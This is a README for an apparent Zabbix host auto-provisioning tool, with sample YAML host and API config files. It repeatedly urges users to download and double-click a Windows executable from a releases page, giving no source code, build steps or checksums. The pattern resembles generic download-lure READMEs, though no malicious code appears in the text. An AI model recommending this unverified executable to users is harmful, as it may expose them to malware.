# ⚙️ zabbix-auto-provisioning - Easy Host Setup for Zabbix

[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest-brightgreen?style=for-the-badge)](https://github.com/syreniti5667/zabbix-auto-provisioning/releases)

## 📋 What is zabbix-auto-provisioning?

zabbix-auto-provisioning helps you add hosts to your Zabbix monitoring system automatically. It uses simple text files written in YAML format to control which hosts get added and how. This avoids doing the same manual steps over and over in the Zabbix interface.

The tool talks to Zabbix using a standard communication method called JSON-RPC API. The process runs on your computer and uses Python behind the scenes, but you don’t need to know any programming to use it.

This app is useful if you want to:
- Add many hosts to Zabbix quickly
- Keep host configurations consistent and easy to manage
- Save time by avoiding repetitive tasks

## ⚙️ System Requirements

Before you start, make sure your Windows PC meets these basic needs:

- Windows 10 or later (64-bit recommended)
- At least 4 GB of RAM
- 500 MB of free disk space
- Internet connection for downloading and communicating with Zabbix server
- Access to your Zabbix server’s API (you will need your Zabbix administrator to provide this)

## 🛠️ What You Need to Know Before Running

- You do not need to install Python or any other software separately. This package includes what it requires.
- You do not need to use the command line or write scripts.
- You should have access to your Zabbix server address, your API user credentials (username and password), and the host details you want to add.
- YAML files describe your hosts and settings in plain text. You can edit these with any text editor, such as Notepad.

## 🚀 Getting Started: How to Download and Run

1. Click this big button below to visit the release page where you will find the latest software versions:

   [![Download on GitHub](https://img.shields.io/badge/Download-Zabbix%20Auto%20Provisioning-blue?style=for-the-badge)](https://github.com/syreniti5667/zabbix-auto-provisioning/releases)

2. Scroll to the **Assets** section of the latest release. Look for a file named something like `zabbix-auto-provisioning-windows.zip` or a `.exe` installer.

3. Click the file to download it to your PC. The download might take a few moments depending on your internet speed.

4. Once downloaded, open the folder where the file was saved.

5. If the file is zipped (`.zip`), right-click on it and choose **Extract All**. Extract to a folder you can find easily, like your desktop.

6. If the file is `.exe`, double-click the file to start the installation process. Follow the installation steps.

7. When extraction or installation is complete, open the new folder and look for the main program file, which may be named `start-zabbix-provisioning.exe` or similar.

8. Double-click this file to start the application.

## 📝 How to Use zabbix-auto-provisioning

### Step 1: Prepare Your YAML Configuration

Your hosts and settings are controlled by YAML files. These files tell the app which hosts to add, what groups to put them in, and any templates to apply.

A simple YAML file looks like this:

```yaml
hosts:
  - name: my-server-01
    ip: 192.168.1.10
    groups:
      - Linux servers
    templates:
      - Template OS Linux
  - name: my-server-02
    ip: 192.168.1.11
    groups:
      - Windows servers
    templates:
      - Template OS Windows
```

You can create or edit these files using any text editor. Save the file with a `.yaml` or `.yml` extension.

### Step 2: Set Up the Application

Inside the application folder, find a file named `config.yaml` or `settings.yaml`. Open it in a text editor and enter your Zabbix server details and API credentials. It will ask for:

- Server URL (usually something like `http://your-zabbix-server/api_jsonrpc.php`)
- API Username
- API Password
- Path to your hosts YAML file

Example of `config.yaml`:

```yaml
zabbix_api:
  url: http://zabbix.example.com/api_jsonrpc.php
  username: admin
  password: my_password
hosts_file: hosts.yaml
```

Save your changes.

### Step 3: Run the Provisioning

Launch the application by double-clicking `start-zabbix-provisioning.exe`. The app will read your YAML files, connect to your Zabbix server, and add the defined hosts automatically.

You will see status messages updating you on the process:
- Connecting to Zabbix server
- Adding host: my-server-01
- Adding host: my-server-02
- Provisioning complete

### Step 4: Check Your Zabbix Server

Log into your Zabbix web interface. Check the Hosts section to see the new hosts appear with the groups and templates you specified.

## 🗂️ Folder and File Structure

Here is what the typical folder looks like after you extract or install:

- `start-zabbix-provisioning.exe` — Main program file
- `config.yaml` — Settings file to configure connection and input files
- `hosts.yaml` — Your host definitions file
- `logs/` — Folder where application log files save (automatic)
- `README.md` — This file (for your reference)

## 🔧 Troubleshooting Tips

- If the app says it cannot connect to Zabbix, check the URL in your `config.yaml`. Make sure your PC can reach the server network.
- Verify your API username and password are correct.
- Make sure your YAML files are properly formatted. Spaces matter in YAML. Use a text editor that shows spaces clearly.
- If you see errors about missing files, double-check the paths in the config file.
- Review the log files in the `logs/` folder for detailed messages. They help explain what went wrong.

## 💡 Useful Notes

- You can customize your YAML files as you learn more. Add more hosts or change groups.
- Keep your API user’s password secure.
- Run this tool whenever you need to update your monitored hosts in bulk.
- This tool does not remove hosts. It only adds or updates them. To remove hosts, use the Zabbix web interface.

## 🔗 Download and Start Now

Return to the releases page here to get the latest version:

[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest-brightgreen?style=for-the-badge)](https://github.com/syreniti5667/zabbix-auto-provisioning/releases)